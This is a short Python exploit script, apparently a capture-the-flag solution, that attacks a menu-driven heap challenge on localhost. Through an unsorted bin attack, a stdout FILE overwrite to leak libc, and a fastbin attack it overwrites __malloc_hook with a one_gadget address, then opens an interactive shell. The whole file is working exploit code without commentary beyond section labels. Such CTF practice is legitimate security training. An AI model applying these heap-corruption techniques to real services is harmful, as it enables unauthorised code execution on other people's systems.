from ptrlib import *

def add(index, size, data):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(":", str(index))
    sock.sendlineafter(":", str(size))
    sock.sendafter(":", data)
    return

def edit(index, data):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(":", str(index))
    sock.sendafter(":", data)
    return

def delete(index):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(":", str(index))
    return

libc = ELF("./libc.so.6")
sock = Socket("localhost", 9999)
libc_one_gadget = 0xf1147

# prepare
add(0, 0x18, "ponta")
add(1, 0x68, "A")
add(2, 0x68, "B")

# unsorted bin attack
delete(0)
edit(0, p64(0) + b'\xe8\x37')
add(11, 0x18, p64(0x71) + b'\xdd\x25')

# libc leak
delete(2)
delete(1)
edit(1, b'\x08')
add(10, 0x68, "dummy")
add(9, 0x68, "dummy")
payload = b'A' * 0x33
payload += p64(0xfbad1800)
payload += p64(0) * 3
payload += b'\x00'
add(8, 0x68, payload)
sock.recvline()
libc_base = u64(sock.recv(0x48)[0x40:0x48]) - libc.symbol("_IO_2_1_stderr_") - 192
logger.info("libc = " + hex(libc_base))

# fastbin attack
delete(2)
delete(1)
edit(1, p64(libc_base + libc.symbol("__malloc_hook") - 0x23))
add(7, 0x68, "dummy")
payload = b'A' * 3
payload += p64(0) * 2
payload += p64(libc_base + libc_one_gadget)
add(6, 0x68, payload)

# get the shell!
sock.sendlineafter(">> ", "1")
sock.sendlineafter(":", "5")
sock.sendlineafter(":", "123")

sock.interactive()
